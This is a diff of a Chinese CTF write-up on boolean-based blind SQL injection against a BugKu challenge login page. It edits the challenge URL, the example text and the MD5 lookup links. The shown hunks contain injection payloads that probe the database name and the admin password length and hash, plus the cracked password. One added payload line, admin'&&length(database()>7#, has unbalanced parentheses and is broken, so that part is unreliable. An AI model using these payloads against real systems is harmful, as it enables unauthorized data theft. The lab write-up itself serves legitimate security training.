@@ -6,7 +6,7 @@
 - **难度**: 4星
 - **金币**: 4
 - **分数**: 40
-- **题目地址**: http://160.202.254.160:16236/index.php
+- **题目地址**: http://160.202.254.160:19758/index.php
 - **提示**: 基于布尔的SQL盲注，有大量过滤
 
 ---
@@ -17,7 +17,7 @@
 
 **普通SQL注入**: 页面直接显示数据库查询结果，你能直接看到数据。
 
-**布尔盲注**: 页面只返回 True/False（如"password error!" vs "username does not exist!"），你需要通过猜测来逐步获取数据。
+**布尔盲注**: 页面只返回 True/False（如本题中的"password error!" vs "username does not exist!"），你需要通过猜测来逐步获取数据。
 
 **基于布尔**: 根据页面返回的内容不同来判断条件是否成立。
 
@@ -175,7 +175,7 @@
 admin'&&length(database())>5#      -> password error!（真）
 admin'&&length(database())>10#     -> password error!（真）
 admin'&&length(database())>8#      -> username does not exist!（假）
-admin'&&length(database())=8#      -> password error!（真）
+admin'&&length(database()>7#      -> password error!（真）
 ```
 
 **结论**: 数据库名长度为 **8**。
@@ -220,7 +220,6 @@ admin'&&(select(count(0))from(admin))>0#     -> password error!（真）
 admin'&&length((select(password)from(admin)))>30#  -> password error!（真）
 admin'&&length((select(password)from(admin)))>31#  -> password error!（真）
 admin'&&length((select(password)from(admin)))>32#  -> username does not exist!（假）
-admin'&&length((select(password)from(admin)))=32#  -> password error!（真）
 ```
 
 **结论**: 密码长度为 **32**，疑似 MD5 哈希。
@@ -242,6 +241,7 @@ admin'&&(select(password)from(admin))regexp'^4dcc88f8f1bc05e7c2ad1a60288481a2'# 
 使用在线 MD5 解密工具:
 - https://www.cmd5.com/
 - https://md5.gromweb.com/
+- https://www.somd5.com/ #免费
 
 输入 `4dcc88f8f1bc05e7c2ad1a60288481a2`，解密得到: **bugkuctf**
 
@@ -536,4 +536,4 @@ BugKu SQL注入 - 布尔盲注自动化脚本
 
 - [BugKu CTF 平台](https://ctf.bugku.com/)
 - [SQL注入 - 布尔盲注](https://www.freebuf.com/articles/web/183579.html)
-- [MD5 在线解密](https://www.cmd5.com/)
+- [MD5 在线解密](https://www.somd5.com/)
